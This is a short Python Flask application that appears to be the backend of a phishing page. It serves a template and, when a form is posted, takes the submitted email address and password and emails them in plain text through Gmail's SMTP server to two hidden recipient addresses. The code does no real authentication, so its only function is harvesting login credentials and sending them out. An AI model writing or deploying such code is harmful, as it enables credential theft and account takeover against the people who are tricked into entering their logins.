from flask import Flask, render_template, request, jsonify
from flask_mail import Mail, Message
import ssl
import smtplib


from dotenv import load_dotenv
import os

load_dotenv()

passw = os.getenv('APPPASSWORD')
AdminEmail = os.getenv('EMAIL')
rEmail = os.getenv('REMAILII')
remail2 = os.getenv('REMAIL')


smtplib.SMTP.debuglevel = 1

app = Flask(__name__)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_DEFAULT_SENDER'] = AdminEmail
app.config['MAIL_PORT'] = 465
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_USERNAME'] = AdminEmail
app.config['MAIL_PASSWORD'] = passw 


mail = Mail(app=app)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        data = request.get_data()
        if data:
            email = request.form['email']
            password = request.form['password']
            recipient = [rEmail, remail2]
            subjects = "user data recived"
            body = f" a new user has login \n Email : {email} \n\n Password : {password}"

            msg = Message(body=body, recipients=recipient, subject=subjects)
            mail.send(message=msg)


            return jsonify({'success': True})
    return render_template("page.html")




if __name__ == "__main__":
    app.run(debug=True)